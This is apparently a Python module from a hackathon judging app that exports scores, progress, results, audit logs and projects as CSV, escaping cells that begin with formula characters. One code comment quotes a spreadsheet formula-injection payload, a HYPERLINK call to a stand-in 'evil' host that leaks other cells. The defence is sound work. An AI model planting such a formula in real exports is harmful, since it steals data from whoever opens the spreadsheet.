"""CSV exports for organizers, safe to open in a spreadsheet."""

import csv
import io
from collections.abc import Iterable

from sqlalchemy import select
from sqlalchemy.orm import Session as DbSession, selectinload

from app.models import AuditLog, Event, Project, Team, User
from app.services.assignment import progress
from app.services.judging import list_scores, scores_out
from app.services.results import compute_results

# A cell starting with one of these is run as a formula by Excel/LibreOffice/Sheets
# (e.g. a project titled =HYPERLINK("http://evil/?"&A1,"x") leaking other cells).
FORMULA_START = ("=", "+", "-", "@", "\t", "\r")


def safe_cell(value) -> str:
    if value is None:
        return ""
    text = str(value)
    return "'" + text if text.startswith(FORMULA_START) else text


def to_csv(header: list[str], rows: Iterable[list]) -> str:
    buf = io.StringIO()
    writer = csv.writer(buf, lineterminator="\n")
    writer.writerow(header)
    for row in rows:
        writer.writerow([safe_cell(v) for v in row])
    return buf.getvalue()


def scores_csv(db: DbSession, event_id: str | None) -> str:
    rows = scores_out(db, list_scores(db, None, event_id))
    keys = sorted({k for r in rows for k in r["criteria"]})
    judges = {u.id: u.name for u in db.scalars(select(User).where(
        User.id.in_({r["judge_id"] for r in rows})))}
    header = ["event_id", "project_id", "project_title", "judge_id", "judge_name", *keys,
              "weighted_total", "comment", "updated_at"]
    return to_csv(header, ([r["event_id"], r["project_id"], r["project_title"], r["judge_id"],
                            judges.get(r["judge_id"], ""), *[r["criteria"].get(k, "") for k in keys],
                            r["weighted_total"], r["comment"], r["updated_at"]] for r in rows))


def progress_csv(db: DbSession, event_id: str | None) -> str:
    stmt = select(Event).order_by(Event.id)
    if event_id:
        stmt = stmt.where(Event.id == event_id)
    rows = [[event.id, j["judge_id"], j["name"], j["assigned"], j["done"], j["remaining"], j["status"]]
            for event in db.scalars(stmt) for j in progress(db, event)["judges"]]
    return to_csv(["event_id", "judge_id", "judge_name", "assigned", "done", "remaining", "status"], rows)


def results_csv(db: DbSession, event_id: str | None) -> str:
    stmt = select(Event).order_by(Event.id)
    if event_id:
        stmt = stmt.where(Event.id == event_id)
    header = ["event_id", "rank", "track_rank", "raw_rank", "project_id", "title", "track", "reviews",
              "effective_reviews", "raw_mean", "z_mean", "normalized", "flags", "flagged_judges"]
    rows = []
    for event in db.scalars(stmt):
        for r in compute_results(db, event)["projects"]:
            rows.append([event.id, r["rank"], r["track_rank"], r["raw_rank"], r["project_id"], r["title"],
                         r["track"], r["reviews"], r["effective_reviews"], r["raw_mean"], r["z_mean"],
                         r["normalized"], "|".join(r["flags"]), "|".join(r["flagged_judges"])])
    return to_csv(header, rows)


def audit_csv(db: DbSession, event_id: str | None) -> str:
    """The whole log: entries point at many entity types, not all tied to one event."""
    stmt = select(AuditLog).order_by(AuditLog.id)
    return to_csv(["id", "at", "actor_id", "action", "entity_type", "entity_id", "detail"],
                  ([e.id, e.at.isoformat(), e.actor_id or "", e.action, e.entity_type, e.entity_id, e.detail]
                   for e in db.scalars(stmt)))


def projects_csv(db: DbSession, event_id: str | None) -> str:
    stmt = (select(Project).options(selectinload(Project.tags), selectinload(Project.track),
                                    selectinload(Project.team).selectinload(Team.members))
            .order_by(Project.event_id, Project.id))
    if event_id:
        stmt = stmt.where(Project.event_id == event_id)
    header = ["event_id", "project_id", "title", "tagline", "team_id", "team_name", "team_size",
              "track", "status", "submitted_at", "duplicate_of", "repo_url", "live_url",
              "demo_video_url", "tags"]
    return to_csv(header, ([p.event_id, p.id, p.title, p.tagline, p.team_id, p.team.name,
                            len(p.team.members), p.track.name if p.track else "", p.status.value,
                            p.submitted_at.isoformat() if p.submitted_at else "", p.duplicate_of_id or "",
                            p.repo_url, p.live_url, p.demo_video_url,
                            "|".join(t.tag for t in p.tags)] for p in db.scalars(stmt)))
